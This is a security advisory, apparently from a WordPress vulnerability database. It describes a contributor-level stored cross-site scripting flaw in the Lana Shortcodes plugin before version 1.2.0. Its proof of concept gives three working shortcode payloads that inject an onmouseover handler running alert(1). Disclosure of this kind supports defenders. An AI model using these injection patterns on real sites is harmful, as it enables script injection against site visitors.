## WordPress Plugin Vulnerabilities

# Lana Shortcodes < 1.2.0 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which allows users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

Insert any of the following shortcodes in a page/post:
\*Button shortcode
[lana\_button size="md" type='" onmouseover="alert(1)" style="background:red;"']Lana Button[/lana\_button]
\*Icon shortcode
[lana\_icon name='home" onmouseover="alert(1)" style="background:red;"']
\*Label shortcode
[lana\_label type='" onmouseover="alert(1)" style="background:red;"']New[/lana\_label]
